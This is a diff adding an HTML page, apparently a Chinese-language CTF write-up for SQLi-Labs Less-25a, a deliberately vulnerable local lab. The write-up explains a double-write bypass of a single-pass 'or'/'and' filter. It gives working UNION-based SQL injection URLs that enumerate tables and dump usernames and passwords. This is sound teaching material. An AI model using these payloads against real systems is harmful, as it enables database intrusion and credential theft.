@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-25a 纯数字型双写绕过 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-25a 纯数字型双写绕过 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 双写绕过, 联合查询</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-25a (GET - Trick with OR & AND - Blind Based)</li>
+        <li><strong>提示：</strong>纯数字型注入，过滤了关键字，注释符可用，无报错回显。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>根据源码审计，本关卡后台 SQL 为 <code>$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</code>。</p>
+    <ul>
+        <li><strong>上下文</strong>：纯数字型（无单引号、无括号）。</li>
+        <li><strong>过滤机制</strong>：使用 <code>preg_replace</code> 单次替换 <code>or</code> 和 <code>and</code>，存在双写绕过漏洞。</li>
+        <li><strong>报错屏蔽</strong>：<code>mysql_error()</code> 被注释，无法进行报错注入，但联合查询（UNION）可用。</li>
+    </ul>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：确认注入点与占位</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0 union select 1,database(),3-- -</code></p>
+    <p><strong>回显现象：</strong>页面第 2 列回显 <code>security</code>。</p>
+    <p><strong>解释与原理：</strong>由于是纯数字型，无需闭合引号。使用 <code>0</code> 作为前置条件（原库中不存在 id=0 的数据），让前置查询为空，从而回显后方的 <code>UNION SELECT</code> 结果。<code>-- -</code> 用于注释掉原代码尾部的 <code>LIMIT 0,1</code>。</p>
+
+    <p><strong>第二步：双写绕过查询表名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0 union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()-- -</code></p>
+    <p><strong>回显现象：</strong>第 2 列回显 <code>emails,referrers,uagents,users</code>。</p>
+    <p><strong>解释与原理：</strong>由于 <code>or</code> 被过滤，<code>information</code> 关键字必须双写为 <code>infoorrmation</code>。系统的正则替换删掉中间的 <code>or</code>，剩下合法的 <code>information</code>。</p>
+
+    <p><strong>第三步：双写绕过脱库</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0 union select 1,group_concat(username,0x3a,passwoorrd),3 from users-- -</code></p>
+    <p><strong>回显现象：</strong>第 2 列回显所有账号密码，包含 <code>Dumb:Dumb,Angelina:I-kill-you</code> 等。</p>
+    <p><strong>解释与原理：</strong><code>password</code> 关键字包含 <code>or</code>，必须双写为 <code>passwoorrd</code> 绕过过滤。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>上下文误判</strong>：切勿习惯性地在数字型注入点后添加单引号或括号，否则会导致语法报错。</li>
+        <li><strong>非递归过滤</strong>：双写绕过的核心在于系统的正则只执行一次，利用重叠字符生成敏感词。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>双写绕过</strong>：`infoorrmation_schema` 与 `passwoorrd`。</li>
+        <li><strong>数字型注入</strong>：无需闭合任何符号，直接用 <code>0</code> 或 <code>-1</code>（若无减号过滤）占位进行 UNION 注入。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
